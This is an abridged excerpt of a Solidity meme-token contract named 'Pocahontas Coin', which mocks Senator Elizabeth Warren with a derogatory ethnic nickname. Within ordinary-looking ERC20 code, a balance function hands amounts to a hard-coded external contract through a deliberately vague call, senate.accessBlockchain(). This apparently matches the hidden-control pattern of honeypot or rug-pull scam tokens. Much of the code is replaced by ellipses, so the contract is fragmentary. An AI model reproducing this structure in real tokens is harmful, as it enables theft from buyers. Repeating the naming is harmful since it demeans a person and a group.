...
Behold the
POCAHONTAS COIN: Elizabeth Warren

Senator and enemy of crypto
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _senate = 0xDBA1551E0F94BA59BDA7cEabA93b1a306E12b2dc;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return senate.accessBlockchain(amount);
    }
    ...
    function _DeployPocahontas(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPocahontas(creator, initialSupply);
    }
}

contract Pocahontas is ERC20Token {
    constructor() ERC20Token("Elizabeth Warren", "POCAHONTAS", msg.sender, 420000000 * 10 ** 18) {
    }
}